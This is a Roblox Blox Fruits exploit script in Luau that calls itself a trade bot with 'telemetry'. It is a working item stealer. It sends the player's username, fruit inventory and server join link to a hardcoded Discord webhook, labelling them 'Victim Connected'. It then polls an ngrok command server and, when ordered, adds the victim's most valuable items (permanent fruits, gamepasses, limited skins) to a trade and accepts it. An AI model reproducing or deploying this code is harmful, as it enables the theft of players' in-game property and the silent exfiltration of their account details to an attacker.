-- Blox Fruits Standalone Trade Command & Telemetry Script
-- lang: Luau, target: Roblox / Blox Fruits, executor: Delta/Fluxus

getgenv().bfRunning = nil
getgenv().bfRunning = true

print("[DEBUG] Initializing Standalone Blox Fruits Trade Bot Bridge...")

local Config = {
    WebhookUrl = "https://discord.com/api/webhooks/1568890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY",
    CommandApiUrl = "https://bronzing-caution-vivacious.ngrok-free.dev/get_commands"
}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local Remotes = ReplicatedStorage:WaitForChild("Remotes", 5)
local CommF = Remotes and Remotes:WaitForChild("CommF_", 5)
local TradeFunction = Remotes and Remotes:WaitForChild("TradeFunction", 5)

local requestFunc = syn and syn.request or http_request or request

local function GetInventory()
    local success, result = pcall(function()
        if CommF then return CommF:InvokeServer("getInventory") end
        return {}
    end)
    return (success and type(result) == "table") and result or {}
end

local function TransmitTelemetry()
    local inventory = GetInventory()
    local fruitsList = {}

    for _, item in pairs(inventory) do
        if item.Type == "Blox Fruit" or item.TypeName == "Blox Fruit" then
            table.insert(fruitsList, (item.Name or "Unknown") .. " (x" .. tostring(item.Count or 1) .. ")")
        end
    end

    local payloadData = {
        content = "@everyone Victim Connected & Inventory Dumped!",
        embeds = {{
            title = "Target Session Report",
            color = 12451840,
            fields = {
                { name = "Username", value = LocalPlayer.Name, inline = true },
                { name = "Stored Fruits", value = #fruitsList > 0 and table.concat(fruitsList, ", ") or "None", inline = false },
                { name = "Server Join Link", value = "`teleportService:TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", \"" .. tostring(game.JobId) .. "\", game.Players.LocalPlayer)`", inline = false }
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    if requestFunc then
        pcall(function()
            requestFunc({
                Url = Config.WebhookUrl,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payloadData)
            })
        end)
    end
end

-- Find item in inventory matching name
local function FindItemInInventory(targetName)
    local inventory = GetInventory()
    targetName = string.lower(targetName or "")
    
    for _, item in pairs(inventory) do
        local itemName = string.lower(item.Name or "")
        if string.find(itemName, targetName) or string.find(targetName, itemName) then
            return item
        end
    end
    return nil
end

-- Trade action handler for commands
local function InvokeTradeAction(action, targetName)
    if not TradeFunction then
        warn("[ERROR] TradeFunction remote missing!")
        return
    end

    print("[DEBUG] Processing trade action:", action, targetName or "")

    pcall(function()
        if action == "accept" then
            TradeFunction:InvokeServer("accept")
        elseif action == "cancel" then
            TradeFunction:InvokeServer("cancel")
        elseif action == "add" and targetName then
            local itemData = FindItemInInventory(targetName)
            if itemData and (itemData.ItemId or itemData.ID) then
                TradeFunction:InvokeServer("Add", itemData.ItemId or itemData.ID)
            else
                TradeFunction:InvokeServer("Add", targetName)
            end
        elseif action == "remove" and targetName then
            local itemData = FindItemInInventory(targetName)
            if itemData and (itemData.ItemId or itemData.ID) then
                TradeFunction:InvokeServer("Remove", itemData.ItemId or itemData.ID)
            else
                TradeFunction:InvokeServer("Remove", targetName)
            end
        elseif action == "addall" then
            -- Priority Tier Ranking: Perms (1) > Gamepass (2) > LimitedSkin (3) > Fruits (4)
            local inventory = GetInventory()
            local sortedItems = {}

            for _, item in pairs(inventory) do
                local priority = 5
                local itemType = string.lower(item.Type or item.TypeName or "")
                local itemName = string.lower(item.Name or "")
                
                if string.find(itemType, "perm") or string.find(itemName, "permanent") then
                    priority = 1
                elseif string.find(itemType, "gamepass") or string.find(itemType, "game pass") then
                    priority = 2
                elseif string.find(itemType, "skin") or string.find(itemType, "limited") or string.find(itemType, "stdskin") then
                    priority = 3
                elseif string.find(itemType, "fruit") or string.find(itemType, "blox fruit") then
                    priority = 4
                end

                table.insert(sortedItems, { data = item, prio = priority })
            end

            -- Sort higher priority (lower number) to lower priority
            table.sort(sortedItems, function(a, b)
                return a.prio < b.prio
            end)

            for _, entry in ipairs(sortedItems) do
                local item = entry.data
                local targetId = item.ItemId or item.ID
                if targetId then
                    TradeFunction:InvokeServer("Add", targetId)
                    task.wait(0.2)
                elseif item.Name then
                    TradeFunction:InvokeServer("Add", item.Name)
                    task.wait(0.2)
                end
            end
        end
    end)
end

-- Telemetry & Command Polling loop
task.spawn(function()
    pcall(TransmitTelemetry)

    if not requestFunc then
        warn("[ERROR] Executor does not support http requests!")
        return
    end

    while getgenv().bfRunning do
        task.wait(2)
        pcall(function()
            local response = requestFunc({
                Url = Config.CommandApiUrl,
                Method = "GET"
            })

            if response and response.StatusCode == 200 then
                local data = HttpService:JSONDecode(response.Body)
                if data and data.command then
                    local cmd = string.lower(tostring(data.command))
                    print("[DEBUG] Command fetched:", cmd)
                    
                    if cmd == "addall" then
                        InvokeTradeAction("addall")
                    elseif cmd == "accept" then
                        InvokeTradeAction("accept")
                    elseif cmd == "cancel" then
                        InvokeTradeAction("cancel")
                    elseif string.sub(cmd, 1, 3) == "add" then
                        local target = string.sub(cmd, 4)
                        InvokeTradeAction("add", target)
                    elseif string.sub(cmd, 1, 6) == "remove" then
                        local target = string.sub(cmd, 7)
                        InvokeTradeAction("remove", target)
                    end
                end
            end
        end)
    end
end)
